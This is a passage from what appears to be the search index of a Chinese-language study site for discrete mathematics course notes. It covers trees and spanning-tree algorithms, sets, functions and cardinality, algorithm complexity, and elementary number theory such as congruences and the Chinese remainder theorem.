<li>\u5728F\u4e2dpop\u4e24\u9897\u6839\u8282\u70b9\u6743\u503c\u6700\u5c0f\u7684\u4e8c\u53c9\u6811\uff0c\u4f5c\u4e3a\u6811\u7684\u5de6\u53f3\u5b69\u5b50\u6784\u9020\u65b0\u6811\uff0c\u4e14\u7f6e\u6839\u8282\u70b9\u4e3a\u5de6\u53f3\u5b69\u5b50\u6743\u503c\u4e4b\u548c\uff0c\u5c06\u65b0\u4e8c\u53c9\u6811\u538b\u5165F\u4e2d</li> <li>\u91cd\u590d\u4e0a\u4e00\u6b65\uff0c\u76f4\u5230F\u4e2d\u53ea\u5269\u4e00\u9897\u6811\uff0c\u8fd9\u9897\u6811\u5c31\u662fHuffman Tree</li> </ul> <p>Danger</p> <p>\u9047\u5230\u8bf8\u5982 <code>What is the average number of bits required to encode a character?</code> \uff0c\u6ce8\u610f\u6700\u540e\u7ed3\u679c\u4e0d\u662f\u5355\u7eaf\u7684\u6240\u6709bit\u4f4d\u76f8\u52a0\u9664\u4ee5\u5b57\u6bcd\u6570\uff0c\u800c\u662f\u5404\u4e2acharacter\u7684bit\u4f4d\u6570\u4e58\u4ee5\u5b83\u4eec\u7684\u6743\u503c\u518d\u76f8\u52a0 (\u5373 \u52a0\u6743\u5e73\u5747\u6570 )</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#113-tree-traversal","title":"11.3 Tree Traversal","text":"<ul> <li>preorder traversal \u5bf9\u5e94 Prefix Form(\u6ce2\u5170\u8868\u8fbe\u5f0f)</li> <li>inorder traversal \u5bf9\u5e94 Infix Form(\u6b63\u5e38\u7684\u8868\u8fbe\u5f0f)</li> <li>postorder traversal \u5bf9\u5e94 Postfix Form(\u9006\u6ce2\u5170\u8868\u8fbe\u5f0f)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#114-spanning-tree","title":"11.4 Spanning Tree","text":"<ul> <li>G\u7684\u751f\u6210\u6811\u6307\u5305\u542b\u6bcf\u4e2a\u9876\u70b9\u7684\u5b50\u56fe<ul> <li>Find spanning tree by removing edges from simple circuits</li> </ul> </li> <li>\u7b80\u5355\u56fe\u8fde\u901a\u5f53\u4e14\u4ec5\u5f53\u5b83\u6709\u751f\u6210\u6811</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#how-to-find-a-spanning-tree","title":"How to find a spanning tree","text":"Depth-First SearchBreadth-First Search <ul> <li>\u4ece\u56fe\u4e2d\u9009\u62e9\u4e00\u4e2a\u8d77\u59cb\u9876\u70b9\u4f5c\u4e3a\u6839\u8282\u70b9\u3002</li> <li>\u4f7f\u7528 DFS \u904d\u5386\u56fe\uff0c\u8bb0\u5f55\u904d\u5386\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u7684\u8fb9\u3002</li> <li>\u904d\u5386\u5b8c\u6210\u540e\uff0c\u8bb0\u5f55\u7684\u8fb9\u5c06\u5f62\u6210\u56fe\u7684\u4e00\u68f5\u751f\u6210\u6811\u3002</li> </ul> <pre><code>  void dfs(int u) {\n      visited[u] = 1;\n      for (int v = 0; v &lt; n; v++) {\n      if (adjMatrix[u][v] &amp;&amp; !visited[v]) {\n          /* \u8bb0\u5f55\u8fb9 */\n          // do something\n          dfs(v);\n      }\n  }\n}\n</code></pre> <ul> <li>\u4ece\u56fe\u4e2d\u9009\u62e9\u4e00\u4e2a\u8d77\u59cb\u9876\u70b9\u4f5c\u4e3a\u6839\u8282\u70b9\u3002</li> <li>\u4f7f\u7528 BFS \u904d\u5386\u56fe\uff0c\u8bb0\u5f55\u904d\u5386\u8fc7\u7a0b\u4e2d\u8bbf\u95ee\u7684\u8fb9\u3002</li> <li>\u904d\u5386\u5b8c\u6210\u540e\uff0c\u8bb0\u5f55\u7684\u8fb9\u5c06\u5f62\u6210\u56fe\u7684\u4e00\u68f5\u751f\u6210\u6811\u3002</li> </ul> <pre><code>void bfs(int s) {\n    queue&lt;int&gt; q;\n    q.push(s);\n    visited[s] = 1;\n\n    while (!q.empty()) {\n        int u = q.front();\n        q.pop();\n        for (int v = 0; v &lt; n; v++) {\n            if (adjMatrix[u][v] &amp;&amp; !visited[v]) {\n                /* \u8bb0\u5f55\u8fb9 */\n                // do something\n                q.push(v);\n                visited[v] = 1;\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"Courses/DiscreteMathematics/note/Chapter11/#how-to-find-minimum-spanning-tree","title":"How to find Minimum Spanning Tree","text":"Prim AlgorithmKruskal Algorithm <ol> <li>\u4ece\u56fe\u4e2d\u4efb\u610f\u9009\u62e9\u4e00\u4e2a\u9876\u70b9\u4f5c\u4e3a\u8d77\u59cb\u9876\u70b9\u3002</li> <li>\u521d\u59cb\u5316\u4e00\u4e2a\u96c6\u5408\uff0c\u7528\u4e8e\u5b58\u50a8\u5df2\u7ecf\u8bbf\u95ee\u8fc7\u7684\u9876\u70b9\u3002\u5c06\u8d77\u59cb\u9876\u70b9\u6dfb\u52a0\u5230\u8be5\u96c6\u5408\u4e2d</li> <li>\u521d\u59cb\u5316\u4e00\u4e2a\u4f18\u5148\u961f\u5217\uff0c\u7528\u6765\u50a8\u5b58\u5df2\u8bbf\u95ee\u5230\u7684\u9876\u70b9\u53ef\u4ee5\u8bbf\u95ee\u7684\u8fb9(\u8be5\u8fb9\u4e0d\u80fd\u8fde\u63a5\u4e24\u4e2a\u5df2\u8bbf\u95ee\u8fc7\u7684\u9876\u70b9)</li> <li>\u9009\u62e9\u4e00\u6761\u6743\u503c\u6700\u5c0f\u7684\u8fb9\u5e76\u5c06\u5176\u4ece\u961f\u5217\u4e2d\u5220\u9664\u3002\u5c06\u8be5\u8fb9\u6dfb\u52a0\u5230\u6700\u5c0f\u751f\u6210\u6811\u4e2d\uff0c\u5e76\u5c06\u8be5\u8fb9\u7684\u672a\u8bbf\u95ee\u9876\u70b9\u6807\u8bb0\u4e3a\u5df2\u8bbf\u95ee\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230\u5df2\u8bbf\u95ee\u9876\u70b9\u96c6\u5408\u4e2d\u3002</li> <li>\u91cd\u590d\u6b65\u9aa4 4\uff0c\u76f4\u5230\u6240\u6709\u9876\u70b9\u90fd\u88ab\u8bbf\u95ee\u3002</li> </ol> <ol> <li>\u5c06\u56fe\u4e2d\u7684\u6240\u6709\u8fb9\u6309\u7167\u6743\u503c\u4ece\u5c0f\u5230\u5927\u6392\u5e8f\u3002</li> <li>\u521d\u59cb\u5316\u4e00\u4e2a\u7a7a\u96c6\u5408\uff0c\u7528\u4e8e\u5b58\u50a8\u6700\u5c0f\u751f\u6210\u6811\u7684\u8fb9\u3002</li> <li>\u6309\u987a\u5e8f\u904d\u5386\u6240\u6709\u8fb9\u3002\u9009\u62e9\u4e0d\u548c\u73b0\u5728\u5df2\u6709\u9876\u70b9\u4ea7\u751f\u56de\u8def\u7684\u6700\u5c0f\u8fb9\u3002</li> <li>\u91cd\u590d\u6b65\u9aa4 3\uff0c\u76f4\u5230\u6700\u5c0f\u751f\u6210\u6811\u4e2d\u5305\u542b\u00a0\ud835\udc5b\u22121\u00a0\u6761\u8fb9\uff0c\u5176\u4e2d\u00a0\ud835\udc5b\u00a0\u4e3a\u56fe\u4e2d\u9876\u70b9\u7684\u6570\u91cf\u3002</li> </ol>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/","title":"CH 2. Basic Structure","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter2/#ch-2-basic-structure","title":"CH 2 : Basic Structure","text":"<p> \u7ea6 1319 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#21-sets","title":"2.1 Sets","text":"<p>A set is an unordered collection of objects.</p> <p>\u901a\u5e38\u7528\u5927\u5199\u5b57\u6bcd\u8868\u793a\u96c6\u5408\uff0c\u5c0f\u5199\u5b57\u6bcd\u8868\u793a\u96c6\u5408\u91cc\u7684\u5143\u7d20</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#cardinality","title":"Cardinality \u96c6\u5408\u7684\u52bf","text":"<p>Let S be a set. If there are exactly n distinct elements in S where n is a nonnegative integer, we say that S is a finite set and that n is the cardinality of S.</p> <p>\u7528 |S| \u8868\u793a the cardinality of S</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#power-set","title":"Power set","text":"<p>Power set of S is the set of all subsets of the set S , \u7528 \\(P(S)\\) \u8868\u793a\uff1a\\(P(S)=\\{x|x\\subseteq S\\}\\)</p> <ul> <li>\\(|S|=n\\Rightarrow |P(S)|=2^n\\)</li> <li>\\(S\\) is finite and so is \\(P(S)\\)</li> </ul> <p>Extreme example</p> <p>(1)\\(S=\\{\\emptyset\\}\\)</p> <p>\\(P(S)=\\{\\emptyset ,\\{\\emptyset\\}\\}\\ \\ \\ \\ |P(S)|=2\\) </p> <p>(2)\\(S=\\{\\emptyset ,\\{\\emptyset\\}\\}\\) </p> <p>\\(P(S)=\\{\\emptyset , \\{\\emptyset \\} , \\{\\{\\emptyset\\}\\} , \\{\\emptyset ,\\{\\emptyset\\}\\}\\}\\ \\ \\ \\ |P(S)|=4\\)</p> <p>\u3010Example\u3011</p> <p>\u4e00. Show that \\(P(A)\\in P(B) \\Rightarrow A\\in B\\)</p> \\[\\begin{gather} P(A)\\in P(B) \\Rightarrow P(A)\\subseteq B \\newline \\begin{cases} P(A)\\subseteq B \\newline A\\in P(A) \\end{cases} \\Rightarrow A\\in B \\end{gather} \\] <p>\u4e8c. Show that \\(A\\subseteq B \\Rightarrow P(A)\\subseteq P(B)\\)</p> \\[ \\forall x \\in P(A),\\begin{cases}x\\subseteq A \\\\ A\\subseteq B\\end{cases} \\Rightarrow x\\subseteq B\\Rightarrow x\\in P(B) \\Rightarrow P(A)\\subseteq P(B) \\]"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#cartesian-product","title":"Cartesian Product \u7b1b\u5361\u5c14\u79ef","text":"<p>\u4e5f\u5c31\u662f\u53c9\u4e58\uff1a \\(A\\times B=\\{(a,b)|a\\in A\\land b\\in B\\}\\)</p> <p>\\(A\\times \\emptyset =\\emptyset \\times A\\)</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#22-set-operations","title":"2.2 Set Operations","text":"<ul> <li>Union: \\(A\\cup B=\\{x|x\\in A\\lor x\\in B\\}\\)</li> <li>Intersection: \\(A\\cap B=\\{x|x\\in A \\land x\\in B\\}\\)</li> <li>Difference: \\(A-B=\\{x|x\\in A \\land x\\notin B\\}=A\\cap\\overline{B}\\)</li> </ul> <p>\u7531\u6b64\u5f97\u5230: \\(|A\\cup B|=|A|+|B|-|A\\cap B|\\)</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#23-functions","title":"2.3 Functions","text":"<p>Let \\(A\\) and \\(B\\) be nonempty sets. A unction (mapping or transformations) \\(f\\)\u00a0from \\(A\\) to \\(B\\):</p> \\[ f:A\\to B \\] \\[ Also\\ \\forall a(a\\in A\\to \\exists !b(b\\in B\\land f(a)=b)) \\] <p>\\(A\\) is called domain ,\\(B\\) is called codomain</p> <p>\\(f(a)=b\\)</p> <ul> <li>b is called the image of a under f;</li> <li>a is called a preimage of b;</li> </ul> <p>NOTATION!</p> <ul> <li>\\(f(\\emptyset)=\\emptyset\\)</li> <li>\\(f(\\{a\\})=\\{f(a)\\}\\)</li> <li>\\(f(A\\cup B)=f(A)\\cup f(B)\\)</li> <li>\\(f(A\\cap B)\\subseteq f(A)\\cap f(B)\\)</li> </ul> <p>The graphs of functions:</p> \\[\\{(a,b)|a\\in A \\land f(a)=b\\}\\]"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#_1","title":"\u51e0\u79cd\u51fd\u6570\u7c7b\u578b","text":"<ul> <li>One-to-one / injection / \u5355\u5c04<ul> <li>\\(\\forall a\\forall b(f(a)=f(b)\\to a=b)\\)</li> </ul> </li> <li>Onto / surjection / \u6ee1\u5c04<ul> <li>\\(\\forall b\\in B\\  \\exists a \\in A(f(a)=b)\\)</li> </ul> </li> <li>One-to-one and Onto or one-to-one correspondence / bijection / \u53cc\u5c04\u3001\u4e00\u4e00\u5bf9\u5e94</li> </ul> <p>\u5982\u679c\u5b58\u5728\u51fd\u6570 \\(f\\) \u4f7f\u5f97 \\(A\\) to \\(B\\) \u6709\u4e2a\u53cc\u5c04\uff0c\u5219\u4ed6\u4eec\u5177\u6709\u76f8\u540c\u7684\u52bf\uff08cardinality\uff09</p> <ul> <li>\u5982\u4f55\u8bc1\u660e\u51fd\u6570 f \u662f\u5355\u5c04\u6216\u662f\u6ee1\u5c04\uff1f<ul> <li></li> </ul> </li> </ul> <p>Monotonic Functions \u5355\u8c03\u51fd\u6570</p> <ul> <li>monotonically (strictly) increasing<ul> <li>\\(\\forall x \\forall y(x&lt;y\\to f(x)&lt;f(y))\\)</li> </ul> </li> <li>monotonically (strictly) decreasing<ul> <li>\\(\\forall x \\forall y(x&lt;y\\to f(x)&gt;f(y))\\)</li> </ul> </li> </ul> <p>Inverse Functions \u9006\u51fd\u6570</p> <p>Function f is invertible iff f is a bijection.</p> \\[f^{-1}(y)=x\\ iff\\ f(x)=y\\]"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#some-important-functions","title":"Some important functions","text":"<ul> <li>Floor function<ul> <li>\\(\\lfloor x\\rfloor\\)</li> </ul> </li> <li>Ceiling function<ul> <li>\\(\\lceil x\\rceil\\)</li> </ul> </li> </ul> <p>Info</p> <ul> <li>\\(\\lfloor -x\\rfloor =-\\lceil x\\rceil\\)</li> <li>\\(\\lceil -x\\rceil=-\\lfloor x\\rfloor\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#24-sequence-and-summations","title":"2.4 Sequence and Summations \u6570\u5217\u4e0e\u6c42\u548c","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter2/#definition","title":"Definition","text":"<p>A sequence is a function from a subset of the set of integers (usually either the set {0, 1, 2, \u2026} or the set {1, 2, 3, \u2026}) to a set S. We use the notation \\(a_n\\) to denote the image of the integer n. We call \\(a_n\\) a term of the sequence. (\\(\\{a_n\\}\\))</p> <p>Some Useful Summation Formulae</p> <p></p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#cardinality-of-sets","title":"Cardinality of Sets","text":"<ul> <li>The cardinality of a set A is equal to the cardinality of a set B, denoted | A | = | B |, iff there exists a bijection from A to B.<ul> <li>\u4eceA\u5230B\u6709\u53cc\u5c04\uff0c\u5219A\u548cB\u7b49\u52bf</li> </ul> </li> <li>If there is an injection from A to B, the cardinality of A is less than or the same as the cardinality of B and we write\u00a0 |A| \u2264 |B|. <ul> <li>\u4eceA\u5230B\u6709\u5355\u5c04\uff0c\u5219A\u7684\u52bf\u5c0f\u4e8e\u7b49\u4e8eB</li> </ul> </li> </ul> <p>Prove that |(a,b)| = |(0,1)| in R</p> \\[\\begin{gather}\\frac{x-a}{b-a}=\\frac{y-0}{1-0}\\newline Let\\ f\\ be\\ function\\ from\\ A\\ to\\ B\\ that\\ y=f(x)=\\frac{x-a}{b-a}\\\\ Then\\ y\\ is\\ a\\ bijection\\ from\\ (a,b)\\ to\\ (0,1) \\end{gather} \\] <p>\u3010Definition\u3011 A set that is either finite or has the same cardinality as the set of positive integers called countable.</p> <ul> <li>\u4efb\u4f55\u6709\u9650\u7684\u96c6\u5408\u6216\u8005\u4e0e\u6574\u6570\u96c6\u7b49\u52bf\u7684\u96c6\u5408\u90fd\u79f0\u4f5c countable</li> <li>When an infinite set S is countable, we denote the cardinality of S by \\(\\aleph _0\\) ( aleph null ).</li> <li>If \\(|A|=|Z^+|\\) , the set A is countable infinite.</li> </ul> <p>\u3010Example\u3011</p> <p>Show the set of positive rational numbers \\(|Q^+|=|Z^+|\\)</p> \\[ \\begin{gather} \\forall x \\in Q^{+},x=\\frac{p}{q},\\ p,q\\in Z^+ \\\\Let\\ S=\\{(p,q)|p,q\\in Z^{+}\\}=Z^{+}\\times Z^{+}\\\\ \\begin{cases} |Q^+|\\le |S|\\\\|S|=|Z^+|\\\\|Z^+|\\le |Q^+| \\end{cases}\\Rightarrow |Q^+|=|Z^+| \\end{gather} \\] <p>\u6240\u4ee5\uff0c\u6709\u7406\u6570\u96c6Q\u662f\u53ef\u6570\u7684\u3002</p> <p>\u3010Theorem\u3011 The union of a countable number of countable sets is countable.\uff08\u53ef\u6570\u4e2a\u53ef\u6570\u96c6\u7684\u5408\u96c6\u662f\u53ef\u6570\u7684\uff09</p> <p>\u5b9e\u9645\u4e0a\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e0a\u8ff0\u5b9a\u7406\u8bc1\u660e\u6709\u7406\u6570\u96c6\u53ef\u6570: \u6709\u7406\u6570\u96c6\u7684\u52bf\u53ef\u4ee5\u770b\u4f5c|Z|\u4e2aZ\u7684\u5408\u96c6\u7684\u52bf</p> <p>\u3010Example\u3011</p> <p>Prove that the set of real number between 0 and 1 is uncoutable.</p> \\[ \\begin{gather} A=\\{x|x\\in (0,1)\\land x\\in R\\}\\\\ (1)|Z^+|\\le|A|\\\\ B=\\{\\frac{1}{n+1}|n\\in Z^+\\}\\\\ \\therefore |B|=|Z^+|\\\\ \\because B\\subseteq A\\\\ \\therefore |Z^+|&lt;=|A|\\\\ (2)|Z^+|\\ne |A|\\\\ \\end{gather} \\] <p></p> \\[ \\begin{cases} |Z^+|\\le|A|\\\\|Z^+|\\ne |A| \\end{cases}\\Rightarrow |Z^+|&lt;|A| \\] <p>The set of functions from N to N is uncountable infinite</p> <p>\u628a\u6240\u6709\u51fd\u6570\u90fd\u5217\u51fa\u6765\uff0c\u4e3af1,f2,f3,f4.....\uff0c\u7136\u540e\u4f60\u627e\u4e00\u4e2aG(n)\uff0c\u8ba9G(n)!=fn(n)\uff0c\u8fd9\u6837G(n)\uff0c\u5c31\u4e0d\u5728\u6240\u6709\u7684f\u91cc\u9762\uff0c\u6240\u6709\u4e0d\u53ef\u6570\u4e86</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter2/#_2","title":"\u91cd\u8981\u7ed3\u8bba : \u6709\u7406\u6570\u96c6\u662f\u53ef\u6570\u7684\uff0c\u4f46\u662f\u5b9e\u6570\u96c6\u4e0d\u53ef\u6570","text":"<p>\\(|R| =|R\\times R|\\)</p> <p>\u3010Example\u3011</p> <p>Show that \\(|[0,1]|=|(0,1)|(Both\\ Uncountable)\\)</p> \\[ \\begin{array}l (1)B\\subseteq A \\Rightarrow |B|\\le|A|\\\\ (2)Let\\ g(x)=\\frac{1}{2}x+\\frac{1}{4},x\\in [0,1]\\\\ for\\ g(x)\\ \\text{is a bijection from}\\ [0,1]\\ to\\ [\\frac{1}{4} , \\frac{3}{4}].\\\\ \\therefore |A|\\le|B|\\\\ \\text{Therefore}\\ |A|=|B| \\end{array} \\] <p>\u3010Theorem\u3011 |R|=|(0,1)|\uff1a\u6784\u9020\u51fd\u6570\u5373\u53ef\u8bc1\u660e\uff0c\u5982\\(f(x)=\\frac{2}{\\pi} \\tan(x)\\)</p> <p>\u3010Theorem\u3011 The cardinality of the power set of an arbitrary set has a greater cardinality than the original arbitrary set. \u5373 \\(|P(S)|\\ge |S|\\)</p> <p>\u6ce8\u610f\u7406\u89e3\u9898\u610f</p> <p></p> <ul> <li>\u8fd9\u9898\u4e2d\uff0c\u4e24\u4e2aHotel\u90fd\u6709Countable Infinite\u4e2arooms\uff0c\u56e0\u6b64\u5b9e\u9645\u4e0a\u662f\u8ba9\u6211\u4eec\u505a\u4e00\u4e2a\u4e00\u4e00\u6620\u5c04:<ul> <li>\u5bf9\u4e8e\u5f53\u524d\u4f4f\u57282n\u7684\u4eba\uff0c\u79fb\u5230\u5f53\u524dHotel\u7684room n</li> <li>\u5bf9\u4e8e\u5f53\u524d\u4f4f\u57282n-1\u7684\u4eba\uff0c\u79fb\u5230New Hotel\u7684room n</li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/","title":"CH 3. Algorithms","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter3/#ch-3-algorithms","title":"CH 3 : Algorithms","text":"<p> \u7ea6 367 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>\u5b66\u8fc7\u6570\u636e\u7ed3\u6784\u7684\u5927\u6982\u4e0d\u9700\u8981\u770b\u8fd9\u4e2a\u5427...</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#31-algorithms","title":"3.1 Algorithms","text":"<p>Definition An algorithm is a finite set of precise instructions for performing a computation or for solving a problem.</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#some-common-properties-of-algorithms","title":"Some common properties of algorithms \u7b97\u6cd5\u7684\u6027\u8d28","text":"<ul> <li>Input: An algorithm has input values from a specified set.</li> <li>Output: From each set of input values, an algorithm produces output values from a specified set.</li> <li>Definiteness: The steps of an algorithm must be defined precisely \u51c6\u786e\u6027</li> <li>Correctness: An algorithm should produce the correct output values for each set of\u00a0 input values. \u6b63\u786e\u6027</li> <li>Finiteness: An algorithm should produce the desired output after a finite number of steps for any input in the set. \u6709\u9650\u6027</li> <li>Effectiveness: Each step of an algorithm must be executed exactly and in a finite amount of time. </li> <li>Generality: The procedure should be applicable for all problems of the desired form, not just for a particular set of input values.</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#32-the-growth-of-functions","title":"3.2 The growth of functions","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter3/#factors-to-be-considered-for-choosing-an-algorithm","title":"Factors to be considered for choosing an algorithm","text":"<ul> <li>Simplicity - Easy to implement and obviously correct</li> <li>Clarity - Easy to read and to maintain</li> <li>Extensibility - Can easily be extended to new tasks</li> <li>Reusability - Can be adapted to different tasks</li> <li>Efficiency - Uses time and space well (computation complexity)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#big-o-notation","title":"Big-O Notation","text":"\\[ We\\ say\\ that\\ f(x)=O(g(x))\\ if\\ \\exists C\\exists k\\forall (x\\gt k)\\ |f(x)|\\lt C|g(x)| \\]"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#big-omega-notation","title":"Big-Omega Notation","text":"\\[ We\\ say\\ that\\ f(x)=\\Omega(g(x))\\ if\\ \\exists C\\exists k\\forall (x\\gt k)\\ |f(x)|\\ge C|g(x)| \\]"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#big-theta-notation","title":"Big-Theta Notation","text":"\\[ If\\ f(x)\\ is\\ O(g(x))\\ as\\ well\\ as\\ \\Omega (g(x)),then\\ we\\ say\\ that\\ f(x)=\\Theta(g(x)) \\] <p>Note</p> <ul> <li>\\(O(n^3 2^n)&lt;O(n^2 3^n)\\)</li> <li>\\(O(2^n)\\ne O(3^n)\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter3/#33-complexity-of-algorithms","title":"3.3 Complexity of Algorithms","text":"<p>\u4e24\u4e2a\u65b9\u9762\uff0cspace complexity \u548c time complexity</p> <p>Definition Tractable: A problem is solvable using an algorithm with polynomial worst-case complexity. \u6700\u574f\u60c5\u51b5\u4e0b\u80fd\u591f\u4f7f\u7528\u591a\u9879\u5f0f\u590d\u6742\u5ea6\u7684\u7b97\u6cd5\u89e3\u51b3\u95ee\u9898</p> <p>Class P : Tractable problems</p> <p>Class NP(nondeterministic polynomial time \u975e\u786e\u5b9a\u6027\u591a\u9879\u5f0f\u65f6\u95f4): problems for which a solution can be checked in polynomial time. </p> <p>NP-complete(\u975e\u591a\u9879\u5f0f\u5b8c\u5168\u95ee\u9898): An important class of problems with the property that if any of these problems can be solved by a polynomial worst-case time algorithm, then all can be solved by polynomial worst-case time algorithms.</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/","title":"CH 4. Number Theory and Cryptography","text":""},{"location":"Courses/DiscreteMathematics/note/Chapter4/#ch-4-number-theory-and-cryptography","title":"CH 4 : Number Theory and Cryptography","text":"<p> \u7ea6 362 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/#41-divisibility-and-modular-arithmetic","title":"4.1 Divisibility and Modular Arithmetic","text":"<ul> <li>Division Theorem:\u00a0\ud835\udc4e=\ud835\udc51\ud835\udc5e+\ud835\udc5f (\ud835\udc51&gt;0,0\u2264\ud835\udc5f&lt;\ud835\udc51)<ul> <li>\ud835\udc51\u00a0is the divisor</li> <li>\ud835\udc4e\u00a0is the dividend</li> <li>\ud835\udc5e\u00a0is the quotient \u5546</li> <li>\ud835\udc5f\u00a0is the remainder</li> </ul> </li> </ul> <p>\u8d1f\u6570\u7684Division Theorem?</p> <p>-11 = -4 \u00d7 3 + 1</p> <p>\u4f59\u6570\u8981\u662f\u6b63\u6570</p> <p>Some Theorem</p> <ul> <li>if m divides (a-b) , a is congruent to b modulo m    \u5373 a \u4e0e b \u540c\u4f59</li> <li>\\(a\\equiv b(\\mod m)\\ iff\\ (a\\mod m)=(b\\mod m)\\)</li> <li>\\(a\\equiv b(\\mod m)\\ iff\\ \\exists k\\ such\\ that\\ a=b+km\\)</li> <li>\\(a\\equiv b(\\mod m)\\ and\\ c\\equiv d(\\mod m)\\) , then \\(a+c\\equiv b+d(\\mod m)\\ and\\ ac\\equiv bd(\\mod m)\\)<ul> <li>\u4e00\u4e2a\u6709\u7528\u7684\u63a8\u8bba \\(ab\\mod m=((a\\mod m)(b\\mod m))\\mod m\\)</li> </ul> </li> </ul> <p>\u540c\u4f59\u89e3\u9898\u6b65\u9aa4</p> <p>Solve the system of congruence \\(x\\equiv 3(\\mod 6)\\) and \\(x\\equiv 4(\\mod 7)\\) using the method of back substitution </p>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/#modular-arithmatic","title":"Modular Arithmatic","text":"<ul> <li>Addition modulo : \\(a+_mb=(a+b)\\mod m\\)</li> <li>Multiplication modulo : \\(a\\cdot _mb=(a\\cdot b)\\mod m\\)</li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/#43-primes-and-greatest-common-divisors","title":"4.3 Primes and Greatest Common Divisors","text":"<p>Info</p> <p>There are infinitely many primes (\u53cd\u8bc1\u6cd5\u8bc1\u660e)</p> <ul> <li>Fermat's Little Theorem<ul> <li>\u5bf9\u4e8e\u4efb\u610f\u8d28\u6570p\uff0c\u4efb\u610f\u6574\u6570a\uff0c\u6709 \\(a^p\\equiv a(\\mod p)\\) (\u82e5a\u4e0ep\u4e92\u8d28\uff0c\u5219\u6709 \\(a^{p-1}\\equiv 1(\\mod p)\\) )</li> <li>\u4f8b\u5b50: \u5229\u7528Fertmat\u5b9a\u7406\u6c42\\(3^{302}\\mod 5\\)<ul> <li>\\(3^{300}\\equiv(3 ^{4}) ^{75}\\equiv 1^{75} (\\mod 5)\\)</li> <li>So \\(3^{302}\\mod 5 =9\\mod 5=4\\)</li> </ul> </li> </ul> </li> </ul> ab = gcd(a,b) \u00d7 lcd(a,b) <ul> <li>Let a = bq + r , then gcd(a,b) = gcd(b,r)</li> <li>There exist such integers that gcd(a,b) = sa + tb \u88f4\u8700\u5b9a\u7406<ul> <li></li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/#44-solving-gongruences","title":"4.4 Solving Gongruences","text":"<ul> <li>\u5f62\u5982 \\(ax\\equiv b (\\mod m)\\) \u7684\u65b9\u7a0b\u88ab\u79f0\u4e3a\u540c\u4f59\u65b9\u7a0b<ul> <li>An integer \\(\\overline{a}\\) \u6ee1\u8db3 \\(\\overline{a}a \\equiv 1(\\mod m)\\) \u88ab\u79f0\u4e3a an inverse of a modulo m (\u6570\u8bba\u5012\u6570)<ul> <li>Example: 5 is an inverse of 3 of a modulo 7 since 15%7 = 1</li> </ul> </li> </ul> </li> <li>\u5982\u4f55\u6c42\u89e3\u6570\u8bba\u5012\u6570\uff1f<ul> <li>\u6839\u636e\u88f4\u8700\u5b9a\u7406\uff0c1 = gcd(a,m) = sa + tm , \u4e24\u8fb9\u5bf9 m \u53d6\u6a21\u5f97 \\(sa\\equiv 1(\\mod m)\\) \uff0c\u90a3\u4e48s\u5373\u4e3a\u6570\u8bba\u5012\u6570 </li> <li>\u4f8b\u5b501: \u6c42 101 modulo 4620 \u7684\u6570\u8bba\u5012\u6570<ul> <li></li> </ul> </li> <li>\u4f8b\u5b502: <ul> <li> \\[\\begin{gather}7=2\\times 3+1 \\\\1= (-2)\\times3 +1\\times 7 \\\\1 \\equiv (-2\\times 3+7)\\ \\mod 7 \\\\\\end{gather}\\] </li> </ul> </li> </ul> </li> <li>\u6709\u4e86\u6570\u8bba\u5012\u6570\u540e\uff0c\u65e2\u53ef\u4ee5\u66f4\u516c\u5f0f\u5316\u7684\u6c42\u89e3\u540c\u4f59\u65b9\u7a0b\u4e86:<ul> <li>\u6211\u4eec\u6709 \\(\\overline{a}a \\equiv 1(\\mod m)\\) \u548c \\(ax\\equiv b (\\mod m)\\) \uff0c\u4e24\u8fb9\u540c\u65f6\u4e58\u4ee5 \\(\\overline{a}\\) \u5f97\u5230 \\(x\\equiv \\overline{a}b(\\mod m)\\) </li> </ul> </li> </ul>"},{"location":"Courses/DiscreteMathematics/note/Chapter4/#_1","title":"\u4e2d\u56fd\u5269\u4f59\u5b9a\u7406","text":"<p>\u4f8b\u5b50\uff1a\ud835\udc65\u22612(mod3),\ud835\udc65\u22613(mod5),\ud835\udc65\u22612(mod7)</p> <ul> <li>\ud835\udc5a=3\u22c55\u22c57=105</li> <li>\ud835\udc401=35,\ud835\udc402=21,\ud835\udc403=15</li> 